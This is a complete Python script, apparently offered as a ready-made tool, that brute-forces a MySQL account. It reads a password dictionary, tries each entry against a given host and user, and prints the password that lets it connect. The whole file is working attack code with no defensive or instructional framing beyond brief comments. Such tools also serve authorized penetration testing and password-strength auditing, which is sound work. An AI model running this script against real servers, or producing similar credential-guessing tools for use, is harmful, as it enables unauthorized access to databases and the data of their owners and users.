# Attacks a MySQL database using a dictionary attack
# Usage: python mysql_bruteforce.py <host> <user> <dictionary>

import MySQLdb
import sys

def main():
    if len(sys.argv) != 4:
        print("Usage: python mysql_bruteforce.py <host> <user> <dictionary>")
        sys.exit(1)

    host = sys.argv[1] 
    user = sys.argv[2]
    dictionary = sys.argv[3]

    try:
        f = open(dictionary, "r") # Open the dictionary file
    except IOError: # If the file does not exist
        print ("Error: Could not open dictionary file") 
        sys.exit(1) # Exit the program

    for password in f:
        password = password.strip() # Remove any whitespace
        try:
            db = MySQLdb.connect(host=host, user=user, passwd=password) # Try to connect to the database
            print ("Password found: %s" % password) # If successful, print the password
            db.close() # Close the connection
            break # Exit the loop
        except MySQLdb.Error: # If the password is incorrect
            continue
    f.close() # Close the file

if __name__ == "__main__":
    main()